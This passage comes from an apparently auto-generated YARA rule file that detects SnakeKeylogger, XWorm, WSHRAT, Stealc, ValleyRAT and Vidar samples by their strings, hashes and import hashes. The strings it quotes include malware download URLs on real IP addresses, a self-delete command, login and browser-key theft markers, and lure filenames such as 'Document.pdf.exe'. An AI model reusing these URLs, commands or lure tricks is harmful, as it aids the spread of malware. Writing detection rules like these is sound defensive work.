      $s14 = "syscall.GetCommandLine" fullword ascii /* score: '11.00'*/
      $s15 = "runtime.stopTheWorld.func1" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__6aa7899735e1f990142bacb29f0dd_48 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash3 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
   strings:
      $s1 = "\"UncheckedSetField8UncheckedSetFieldBypassCctor&get_IsFieldInitOnly" fullword ascii /* score: '20.00'*/
      $s2 = "Refresh,GetOrOpenProcessHandle@" fullword ascii /* score: '20.00'*/
      $s3 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstanceFInitializeClosedInstanceToInterface2InitializeOpenStaticThunk" ascii /* score: '18.00'*/
      $s4 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstanceFInitializeClosedInstanceToInterface2InitializeOpenStaticThunk" ascii /* score: '18.00'*/
      $s5 = ",GetHRForLastWin32Error0GetSystemMaxDBCSCharSize" fullword ascii /* score: '15.00'*/
      $s6 = "\"ReadProcessMemory" fullword ascii /* score: '15.00'*/
      $s7 = "`<EnsureThreadPoolBindingInitialized>g__Init|24_0P<GetFileLength>g__GetFileLengthCore|28_0" fullword ascii /* score: '15.00'*/
      $s8 = "&SetFieldBypassCctor@" fullword ascii /* score: '15.00'*/
      $s9 = "VThrowNotSupportedException_UnseekableStreamVThrowNotSupportedException_UnreadableStreamVThrowNotSupportedException_UnwritableSt" ascii /* score: '14.00'*/
      $s10 = "VGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread6RegisterWaitForSingle" ascii /* score: '14.00'*/
      $s11 = "VGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread6RegisterWaitForSingle" ascii /* score: '14.00'*/
      $s12 = "Execute4PerformWaitOrTimerCallback" fullword ascii /* score: '14.00'*/
      $s13 = "SystemParametersInfo" fullword wide /* score: '14.00'*/
      $s14 = " 2TypeLoaderExceptionHelper" fullword ascii /* score: '13.00'*/
      $s15 = "2InitializeExecutionDomain" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a_49 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb0d035f.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "285f27b7a97e4c9020bf006a45433740310630a75b4af405bb0da8a65232d7ff"
      hash2 = "fb0d035fe46a6c23b0f0ae82663a35a05c9b8c7d1b74f096ccff357faf76ab67"
      hash3 = "af5b1c2fea364120adfd97744bf530841c9697df10e63a6672f0e43acbb7f89d"
   strings:
      $s1 = "Player: {0} - AI: {1}" fullword wide /* score: '12.00'*/
      $s2 = "  Game {0}: {1} ({2}) vs {3} ({4}) - {5}" fullword wide /* score: '12.00'*/
      $s3 = "{0} vs {1} - Winner: {2}" fullword wide /* score: '12.00'*/
      $s4 = "get_RoundsToWin" fullword ascii /* score: '9.00'*/
      $s5 = "GetMatchesByRound" fullword ascii /* score: '9.00'*/
      $s6 = "get_Player1Choice" fullword ascii /* score: '9.00'*/
      $s7 = "get_Player2Choice" fullword ascii /* score: '9.00'*/
      $s8 = "GetTotalRounds" fullword ascii /* score: '9.00'*/
      $s9 = "<GetMatchesByRound>b__0" fullword ascii /* score: '9.00'*/
      $s10 = "<GetTotalRounds>b__22_0" fullword ascii /* score: '9.00'*/
      $s11 = "get_TournamentWins" fullword ascii /* score: '9.00'*/
      $s12 = "get_Player2" fullword ascii /* score: '9.00'*/
      $s13 = "get_Player1" fullword ascii /* score: '9.00'*/
      $s14 = "GetRoundName" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__519ad4c0_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a_50 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_519ad4c0.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a787f42.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "519ad4c02d4c375c4b8951855c07b899324f55f69f915a1ea722ddd3fad8708d"
      hash2 = "1a787f42e130fc6ed45415bd9aafce8935489e4a45181c7cd696a85f1209bc04"
   strings:
      $s1 = "<ProcessClientRequests>b__1" fullword ascii /* score: '15.00'*/
      $s2 = "<ProcessClientRequests>b__18_3" fullword ascii /* score: '15.00'*/
      $s3 = "<ProcessClientRequests>b__18_5" fullword ascii /* score: '15.00'*/
      $s4 = "ProcessClientRequests" fullword ascii /* score: '15.00'*/
      $s5 = "<ProcessClientRequests>b__4" fullword ascii /* score: '15.00'*/
      $s6 = "<ProcessClientRequests>b__2" fullword ascii /* score: '15.00'*/
      $s7 = "<ProcessClientRequests>b__0" fullword ascii /* score: '15.00'*/
      $s8 = "../../../Resources/7z.dll" fullword wide /* score: '15.00'*/
      $s9 = "Problem processing client requests. " fullword wide /* score: '15.00'*/
      $s10 = "Finished processing client requests for client: " fullword wide /* score: '15.00'*/
      $s11 = "Send Command" fullword wide /* score: '14.00'*/
      $s12 = "SendCommandButtonHandler" fullword ascii /* score: '12.00'*/
      $s13 = "_clientCommandTextBox" fullword wide /* score: '12.00'*/
      $s14 = "_sendCommandButton" fullword wide /* score: '12.00'*/
      $s15 = "Problem sending command to clients" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _WSHRAT_signature__WSHRAT_signature__fe6b12ee_51 {
   meta:
      description = "_subset_batch - from files WSHRAT(signature).js, WSHRAT(signature)_fe6b12ee.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb6d1dbeec0eb214a619b702f64208c5e7134d8359eeb189896deeb49148a7be"
      hash2 = "fe6b12ee68e5cefd275556913453b51bf78f8b22df913c595ffbb5804861ebcc"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */ /* score: '26.50'*/
      $s6 = "AABAAAAAAAAAAEAAAAAAAAAAD" ascii /* base64 encoded string '  @       @       ' */ /* score: '16.50'*/
      $s7 = "ACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @                                                                                 ' */ /* score: '16.50'*/
      $s8 = "AAAAAAAAAAAAAAFBB" ascii /* base64 encoded string '          PA' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */ /* score: '16.50'*/
      $s10 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                  ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                           ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                      ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                 ' */ /* score: '16.50'*/
      $s14 = "ADAAAAAAAAAA" ascii /* base64 encoded string ' 0       ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAC" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x6176 or uint16(0) == 0x7566 ) and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash___52 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "091f171220ee279ad8a719373ad65527a88d5c8bf108d94976a03618e6d84c39"
      hash2 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash3 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
   strings:
      $x1 = "ring initialization - linker skewattempt to execute system stack code on user stackcompileCallback: function argument frame too " ascii /* score: '31.00'*/
      $s2 = "- invalid sizeattempt to trace invalid or unsupported P statusruntime: waitforsingleobject wait_failed; errno=invalid or incompl" ascii /* score: '24.00'*/
      $s3 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s5 = "areForSweep; sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait" ascii /* score: '20.00'*/
      $s6 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s8 = "epanicwrap: unexpected string after package name: runtime: unexpected waitm - semaphore out of syncs.allocCount != s.nelems && f" ascii /* score: '18.00'*/
      $s9 = "sync/atomic.(*Pointer[go.shape.struct { math/rand.src math/rand.Source; math/rand.s64 math/rand.Source64; math/rand.readVal int6" ascii /* score: '17.00'*/
      $s10 = " argument is gcSweep being done but phase is not GCoffobjects added out of order or overlappingmheap.freeSpanLocked - invalid st" ascii /* score: '17.00'*/
      $s11 = "internal/runtime/atomic.(*Pointer[go.shape.a0c91c71fd368b5d30f8a04d1e4f14a4186fd3423a1957aa58b1e03c3b3735dd]).CompareAndSwapNoWB" ascii /* score: '16.00'*/
      $s12 = "bindm in unexpected GOOSruntime: mp.lockedInt = runqsteal: runq overflowunexpected syncgroup setdouble traceGCSweepStartbad use " ascii /* score: '15.00'*/
      $s13 = "system huge page size (runtime: s.allocCount= s.allocCount > s.nelems/gc/heap/allocs:objectsmissing type in runfinqruntime: inte" ascii /* score: '15.00'*/
      $s14 = "rnal errorwork.nwait > work.nprocleft over markroot jobsgcDrain phase incorrectMB during sweep; swept bad profile stack countrun" ascii /* score: '15.00'*/
      $s15 = "4; math/rand.readPos int8 }]).CompareAndSwap" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphas_53 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_018d7c99.exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e081805b7db9aa700d3e96fe2212493e1d4704a43ec7b57459f7dd0eb33bbd3"
      hash2 = "018d7c99435e7c6ad6fdb7e33e99005aa9a0b98d3571a361227240257ce72aca"
      hash3 = "0b00aac0ad26a93da08c1287ed349bcce15580a5a28d10a63659a9185894dac0"
   strings:
      $s1 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s2 = "internal/syscall/windows.ErrorLoadingGetTempPath2" fullword ascii /* score: '15.00'*/
      $s3 = " checkdead: find g runlock of unlocked rwmutexsigsend: inconsistent statemakeslice: len out of rangemakeslice: cap out of rangeg" ascii /* score: '14.00'*/
      $s4 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.bufp int; os.h syscall.Handle; os.vol uint32; os.c" ascii /* score: '14.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.bufp int; os.h syscall.Handle; os.vol uint32; os.c" ascii /* score: '14.00'*/
      $s6 = "0*struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s7 = "3*[8]struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s8 = "2*[]struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s9 = "internal/reflectlite.rtype.Comparable" fullword ascii /* score: '11.00'*/
      $s10 = "runtime.netpollgoready.goready.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.mapinitnoop" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.panicunsafeslicenilptr" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.panicunsafeslicenilptr1" fullword ascii /* score: '10.00'*/
      $s14 = " phase errorgopark: bad g statusgo of nil func valuesemaRoot rotateRightreflect.makeFuncStubtrace: out of memorywirep: already i" ascii /* score: '10.00'*/
      $s15 = "time.runtimeNano" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__54e8aab77a741ddbe4f0e1d5294d2ba8_imphash__SnakeKeylogger_signature__799e73863806df2964d80d12ce4e6_54 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash2 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
      hash3 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash4 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash5 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash6 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance@" fullword ascii /* score: '18.00'*/
      $s2 = "2InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s3 = "6TryGetTypeTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s4 = "`<EnsureThreadPoolBindingInitialized>g__Init|24_0P<GetFileLength>g__GetFileLengthCore|28_0 __GetFieldHelper@" fullword ascii /* score: '15.00'*/
      $s5 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s6 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
      $s7 = "2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s8 = "NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s9 = ".TryGetGcStaticFieldData6TryGetThreadStaticFieldDataFGetThreadStaticGCDescForDynamicType@" fullword ascii /* score: '12.00'*/
      $s10 = "\"ThrowGreaterEqual(GetRuntimeParameters" fullword ascii /* score: '12.00'*/
      $s11 = "tTryGetConstructedGenericTypeForComponentsNoConstraintCheck" fullword ascii /* score: '12.00'*/
      $s12 = "TransformEntry,ShouldRecurseIntoEntry$ShouldIncludeEntryjSystem.Collections.Generic.IEnumerator<T>.get_Current@" fullword ascii /* score: '12.00'*/
      $s13 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '12.00'*/
      $s14 = "<GetInlinedThreadStaticBaseSlowFGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s15 = "\"get_VersionString$IsOSVersionAtLeast" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__Stealc_signature__02b41c0b7b9e8d9923546bd239883bee_imphash__Stealc_signature__112f19f28f55f461c3d7ad7d389_55 {
   meta:
      description = "_subset_batch - from files Stealc(signature).exe, Stealc(signature)_02b41c0b7b9e8d9923546bd239883bee(imphash).exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash).exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_147f5367.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_26dc688c.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_39ff9695.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_42954fab.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_6b1a8a5f.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_6e7ccf90.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_828d94fc.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_92920202.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_93ef9fe8.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_98a6663b.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_bb8c7062.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_da12bb51.exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_e71791df.exe, Stealc(signature)_142742dbf9c32803f23e9bf4191577a5(imphash).exe, Stealc(signature)_142742dbf9c32803f23e9bf4191577a5(imphash)_bc7be66a.exe, Stealc(signature)_142742dbf9c32803f23e9bf4191577a5(imphash)_e2b70759.exe, Stealc(signature)_5894fa2f94bd689764bc98cc5039e729(imphash).exe, Stealc(signature)_9ccb36ab0ebddd6e2e375d28316da941(imphash).exe, Stealc(signature)_c55498ddbb62cc0999aa7890c60c5648(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f5470590f91a52207b3e68086a521581bbac6d95f9f403a1978afb30fd133421"
      hash2 = "554dc8efc07526d9dd1415381b0fd9d9daf493fd179ce26ba270fc4b34f7390e"
      hash3 = "940aef49acfa551819abd2fe1c129ea9ae18132c7ddb845546aa3a4b71ecf4b7"
      hash4 = "147f53672d406247026a5e5f89d3b92eeb105bc4271f4c2960a55e10ff26d3b1"
      hash5 = "26dc688c89a1a55b01a780d44fb13a44c56dcbcf88e8cf0cc40e26006a102843"
      hash6 = "39ff969553fc1bb48c6aac9e81eb95a2f565f9281ec7a0ece09363d558f65ca1"
      hash7 = "42954fab84aa41fc94bde906e752c1857755713447d161d99930427b5d50f5eb"
      hash8 = "6b1a8a5fced3fa366a2a2675db5d8769017e32bd971f19685b9f0bfa71317034"
      hash9 = "6e7ccf904c2f005c0a2f532c922819ba751d38ec97043d6aa9c9bd08e02b505d"
      hash10 = "828d94fc8d2a5b5c0b131292eb3be2a7348c6e73eaa47564b889a27329676a96"
      hash11 = "929202027b6a2bebd975aaee9753a35f4d6ee5360e9af9100003a825b92febb6"
      hash12 = "93ef9fe8bed1061e8fe615bd1ac409f3e9a1eab0088475a666f2fe31acdb398b"
      hash13 = "98a6663be09da260ef3ef498c18e309714859567ec9b551effc1ad4ed7e8d0e9"
      hash14 = "bb8c7062491a6bfab2038b0726e1b5a7185a90e764c6b9f6fd71b30702f9e422"
      hash15 = "da12bb51dba4817c8250e5002a6a8f9c5adaa3b74e5f442a2de8b05711e59e6a"
      hash16 = "e71791df2374d47d1aaef8ea6af385af8d79ac1f63a28a2404b60e906fee2dab"
      hash17 = "56e0bc5fcde86d5ec036beee0510ec7fe1524fbe04fb1a9a9a1d2a17841384c8"
      hash18 = "bc7be66a20af3d60ad64e90f239461847692c8bdcef8b0da1ff3a455cc048b19"
      hash19 = "e2b70759f9f988713a47d45af35962c1e9ba38745ec40ca3da7f2d8f8425eba6"
      hash20 = "a050d951326e17ba01be5c4ee287ba9c29539fe6fe539fc7b699da21a588ce47"
      hash21 = "040f779d7794c7cb5e991676942e8b89966515981925fbeecbe46c2d56f5ad26"
      hash22 = "4e2d6c29d2cfccdaa177c2a01182e91cc2216c3f9061ab347f43ac88f86b9835"
   strings:
      $s1 = "/c timeout /t 5 & del /f /q \"" fullword ascii /* score: '15.00'*/
      $s2 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide /* score: '15.00'*/
      $s3 = "C:\\builder_v2\\stealc\\json.h" fullword wide /* score: '13.00'*/
      $s4 = "\"app_bound_encrypted_key\":\"" fullword ascii /* score: '12.00'*/
      $s5 = "n_chars < number_buffer.size() - 1" fullword wide /* score: '12.00'*/
      $s6 = "last - first >= std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s7 = "last - first >= kMaxExp + 2" fullword wide /* score: '12.00'*/
      $s8 = "last - first >= 2 + (-kMinExp - 1) + std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s9 = "last - first >= std::numeric_limits<FloatType>::max_digits10 + 6" fullword wide /* score: '12.00'*/
      $s10 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s11 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s12 = "object key" fullword ascii /* score: '9.00'*/
      $s13 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s14 = "buf[len - 1] != '0'" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__02b41c0b7b9e8d9923546bd239883bee_imphash__Stealc_signature__5894fa2f94bd689764bc98cc5039e729_imphash__Ste_56 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_02b41c0b7b9e8d9923546bd239883bee(imphash).exe, Stealc(signature)_5894fa2f94bd689764bc98cc5039e729(imphash).exe, Stealc(signature)_9ccb36ab0ebddd6e2e375d28316da941(imphash).exe, Stealc(signature)_c55498ddbb62cc0999aa7890c60c5648(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "554dc8efc07526d9dd1415381b0fd9d9daf493fd179ce26ba270fc4b34f7390e"
      hash2 = "a050d951326e17ba01be5c4ee287ba9c29539fe6fe539fc7b699da21a588ce47"
      hash3 = "040f779d7794c7cb5e991676942e8b89966515981925fbeecbe46c2d56f5ad26"
      hash4 = "4e2d6c29d2cfccdaa177c2a01182e91cc2216c3f9061ab347f43ac88f86b9835"
   strings:
      $s1 = "Process count: " fullword ascii /* score: '15.00'*/
      $s2 = "parse_logins" fullword ascii /* score: '15.00'*/
      $s3 = "Process List: " fullword ascii /* score: '15.00'*/
      $s4 = "system_info.txt" fullword ascii /* score: '14.00'*/
      $s5 = "v20.txt" fullword ascii /* score: '11.00'*/
      $s6 = "v10.txt" fullword ascii /* score: '11.00'*/
      $s7 = "- Threads: " fullword ascii /* score: '11.00'*/
      $s8 = "- Keyboards: " fullword ascii /* score: '11.00'*/
      $s9 = "- UserName: " fullword ascii /* score: '11.00'*/
      $s10 = "- Cores: " fullword ascii /* score: '10.00'*/
      $s11 = "All Users:" fullword ascii /* score: '9.00'*/
      $s12 = "-nop -c " fullword ascii /* score: '9.00'*/
      $s13 = "Xen - 0" fullword ascii /* score: '9.00'*/
      $s14 = "- Language: " fullword ascii /* score: '8.00'*/
      $s15 = "- Laptop: " fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__0a5a827baa4b0c090f9b543c12c5548b_imphash__Stealc_signature__0a5a827baa4b0c090f9b543c12c5548b_imphash__d19_57 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_0a5a827baa4b0c090f9b543c12c5548b(imphash).exe, Stealc(signature)_0a5a827baa4b0c090f9b543c12c5548b(imphash)_d1911dff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ad4af98f97176039523199982c351b8b310f64c6e28d12a927ef17a5d088132d"
      hash2 = "d1911dff6da25f6c988bc566667bb42f455c2d681eace32e353331996c3510b7"
   strings:
      $s1 = "http://158.94.208.102/rhadamanthys.exe" fullword wide /* score: '27.00'*/
      $s2 = "http://158.94.208.102/lumma.exe" fullword wide /* score: '27.00'*/
      $s3 = "http://158.94.208.190/a.exe" fullword wide /* score: '27.00'*/
      $s4 = "http://158.94.208.190/z.exe" fullword wide /* score: '27.00'*/
      $s5 = "Document.pdf.exe" fullword wide /* score: '22.00'*/
      $s6 = "Photo.jpg.exe" fullword wide /* score: '22.00'*/
      $s7 = "icon=shell32.dll,4" fullword ascii /* score: '21.00'*/
      $s8 = "open=Update.exe" fullword ascii /* score: '19.00'*/
      $s9 = "DfIl%d.exe" fullword wide /* score: '19.00'*/
      $s10 = "\\AppData\\Roaming\\" fullword wide /* score: '15.00'*/
      $s11 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s12 = "\\Temporary Internet Files\\" fullword wide /* score: '12.00'*/
      $s13 = "Documents Backup.lnk" fullword wide /* score: '11.00'*/
      $s14 = "\\AppData\\LocalLow\\" fullword wide /* score: '11.00'*/
      $s15 = "Double-click to view contents" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "0a5a827baa4b0c090f9b543c12c5548b" and ( 8 of them )
      ) or ( all of them )
}

